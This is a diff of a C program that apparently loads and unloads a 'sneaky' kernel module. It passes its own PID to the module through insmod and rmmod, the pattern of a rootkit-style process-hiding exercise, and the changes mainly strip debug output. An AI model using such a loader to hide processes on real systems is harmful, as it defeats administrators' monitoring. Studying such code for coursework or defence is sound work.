@@ -22,7 +22,6 @@ void copy_File(const char *input, const char *output) {
   size_t len = fread(buffer, sizeof(char), numbytes, ifp);
   buffer[len] = '\0';
   fclose(ifp);
-  printf("Buffer reads: %s\n", buffer);
 
   ofp = fopen(output, "w+");
   len = fwrite(buffer, sizeof(char), numbytes, ofp);
@@ -43,29 +42,23 @@ void add_line(const char *input) {
 void load_sneaky(char *moduleName) {
   pid_t cpid, wpid;
   int status;
+  pid_t spid = getpid();
+
   cpid = fork();
   if (cpid == -1) {
     perror("fork");
     exit(1);
   }
   if (cpid == 0) {
-    pid_t spid = getpid();
-    printf("Sneaky PID =%d\n", spid);
+
     char spid_arg[60];
-    sprintf(spid_arg, "sneaky_pid=%d", spid);
+    sprintf(spid_arg, "spid=%d", spid);
     char *args[4];
     args[0] = "insmod";
     args[1] = moduleName;
     args[2] = spid_arg;
     args[3] = NULL;
-    printf("before exec\n");
-    /* int execReturn = */
-    /*     execl("/sbin/insmod", "insmod", moduleName, spid_arg, (char *)0); */
 
-    /* if (execReturn == -1) { */
-    /*   perror("load module exec error"); */
-    /*   exit(EXIT_FAILURE); */
-    /* } */
     int e = execvp(args[0], args);
 
     if (e < 0) {
@@ -97,15 +90,17 @@ void remove_sneaky(char *moduleName) {
 
   pid_t cpid, wpid;
   int status;
+  pid_t spid = getpid();
+
   cpid = fork();
   if (cpid == -1) {
     perror("fork");
     exit(1);
   }
   if (cpid == 0) {
-    pid_t spid = getpid();
+
     char spid_arg[60];
-    sprintf(spid_arg, "sneaky_pid=%d", spid);
+    sprintf(spid_arg, "spid=%d", spid);
     char *args[3];
     args[0] = "rmmod";
     args[1] = moduleName;
